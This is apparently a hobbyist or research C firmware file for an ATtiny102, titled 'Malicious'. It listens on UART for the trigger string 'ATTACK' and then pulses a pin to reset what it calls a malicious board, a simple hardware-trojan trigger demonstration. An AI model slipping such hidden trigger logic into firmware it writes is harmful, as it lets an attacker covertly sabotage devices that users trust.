/*
 * ATtiny102_Malicious.c
 *
 * Created: 1/7/2021 9:35:14 PM
 * Author : louiekotler
 * Some code sampled from Ardunaut
 */ 

#define F_CPU 1000000
#include <avr/io.h>
#include <util/delay.h>
#define LED_PIN     (1 << PA5)
#define BUTTON_PIN  (1 << PB1)       // Not used in this example
#define TRIGGER_PIN (1 << PA0)
// #define BAUD 4800
// #define MYUBRR F_CPU/16/BAUD        // +1, 0 or -1 to adjust the timing.

#define FSOC 1000000 // Clock Speed (8MHz/8, 8 = default divider)
#define BAUD 4800    // Anything higher = corruption. FOSC?
//#define MYUBRR (((( FSOC / 16) + ( BAUD / 2) ) / ( BAUD )) - 1)
#define MYUBRR FSOC / 16 / BAUD -1

void PORTS_Init( void ){
  PUEB |= BUTTON_PIN;               // Enable Pull-Up function in PB1.
  PORTB |= BUTTON_PIN;              // Set Pull-Up for the Button.
  DDRA |= LED_PIN;                  // Configure LED pin as Output.
  DDRA |= TRIGGER_PIN;
}


void USART_Init( unsigned int ubrr){  // Initialize USART
  UBRRH = (unsigned char)(ubrr>>8); // Set the baud rate
  UBRRL = (unsigned char)ubrr;
  UCSRB = (1<<RXEN)|(1<<TXEN);      // Enable Receiver and Transmitter
  UCSRC = (1<<USBS)|(3<<UCSZ0);     // Set Format: 8 data, 2 stop bit
}


void USART_Transmit( unsigned char data ){
  while ( !( UCSRA & (1<<UDRE)) );  // Wait for empty buffer.
  UDR = data;                       // Put data into buffer.
}

unsigned char USART_Receive( void ){
  while ( !(UCSRA & (1<<RXC)) );    // Wait for received data.
  return UDR;                       // Return received data.
}

void USART_Flush( void ){
  while ( UCSRA & (1<<RXC) ){};
}


//-----------------------------------------------------------------------------

int main( void ){
  PORTS_Init();
  USART_Init(MYUBRR);
  PORTA |= LED_PIN;                                          // Switch off the LED.
  unsigned char c[] = {'a', 'a', 'a', 'a', 'a', 'a'};        // Set buffer to useless characters
  unsigned char trigger[] = {'A', 'T', 'T', 'A', 'C', 'K'};  // Trigger string
  unsigned char data;
  
  while(1){	
	data = USART_Receive();

	if(data) {
		c[0] = c[1];
		c[1] = c[2];
		c[2] = c[3];
		c[3] = c[4];
		c[4] = c[5];
		c[5] = data;
		
		USART_Transmit(data); // For testing only
		
		if(c[0]==trigger[0] && c[1]==trigger[1] && c[2]==trigger[2] && c[3]==trigger[3] && c[4]==trigger[4] && c[5]==trigger[5]) {
			USART_Transmit('!');            // Send '!' for testing purposes to show trigger string match
			USART_Transmit( 13 );
			USART_Transmit( 10 );
			PORTA &= ~LED_PIN;              // Switch on the LED.
			PORTA |= TRIGGER_PIN;			// Trigger reset on malicious board by setting TRIGGER_PIN
			_delay_ms(2000);
			PORTA &= ~TRIGGER_PIN; 
			PORTA |= LED_PIN;               // Switch off the LED.
		}
		
	}

  }

}  // End of main.





